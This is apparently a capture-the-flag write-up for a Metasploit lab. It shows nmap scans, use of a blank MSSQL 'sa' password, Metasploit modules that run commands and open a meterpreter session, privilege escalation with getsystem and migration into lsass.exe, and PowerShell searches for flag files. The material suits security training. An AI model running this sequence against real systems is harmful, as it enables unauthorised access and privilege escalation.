## Host & Network Penetration Testing: The Metasploit Framework CTF 1

### Flag 1: Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
```
nmap -sS -Pn -O -p- 10.2.22.159 -T4
```
This scan reveals some ports opened.
Following task, we approach enumeration of port 1433, where we find MSSQL server.
```
nmap 10.2.22.159 -sV -p 1433 --script ms-sql-info
nmap 10.2.22.159 -sV -p 1433 --script ms-sql-empty-password
```
The second one gives us the important information that the login with an empty password is possible.
```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2012
| ms-sql-empty-password: 
|   10.2.22.159\MSSQLSERVER: 
|_    sa:<empty> => Login Success
```
Start Metasploit and configure the auxiliary module:
```
auxiliary/scanner/mssql/mssql_login
```
Remember to set “Createsession” to True.

Then configuring:
```
auxiliary/admin/mssql/mssql_enum
```
with the newly created session, we enumerate all the target system information.

With the help of the module:
```
auxiliary/admin/mssql/mssql_exec
```
setting the CMD option, we can navigate the folders of the target machine.

We find the flag using the command:
```
set CMD “type c:\flag1.txt”
```

### Flag 2: Locate the second flag within the Windows configuration folder.
```
set CMD "dir /s *.txt"
```
This command reveals the third flag but not this one.

We can try another way using Metasploit module:
```
exploit/windows/mssql/mssql_payload
set database master
set username sa
exploit
```
We obtain a meterpreter session and escalate privileges:
```
meterpreter
getsystem
ps
migrate XXX - migrate to a service with more privileges like lsass.exe
shell
```
This way we are able to find the fourth flag thanks to the hint provided in the track:
```
c:\Users\Administrator\Desktop>type flag4.txt
```
Still we cannot find the second flag, so it is time to use powershell
```
meterpreter > load powershell
powershell_shell
Get-ChildItem -Path C:\Windows\System32\ -Recurse -Force -Filter *flag* -ErrorAction SilentlyContinue
```
We finally find the second flag:
```
C:\Windows\system32\config\flag2.txt
```

***Note: we encountered some issue during enumeration due to lack of privileges and hidden folders.***

### Flag 3: The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.

This flag can be found thanks to:
```
set CMD "dir /s *.txt"
&
set cmd "type C:\Windows\system32\drivers\etc\EscaltePrivilageToGetThisFlag.txt"
```
### Flag 4: Investigate the Administrator directory to find the fourth flag.

We already located fourth flag in previous step.

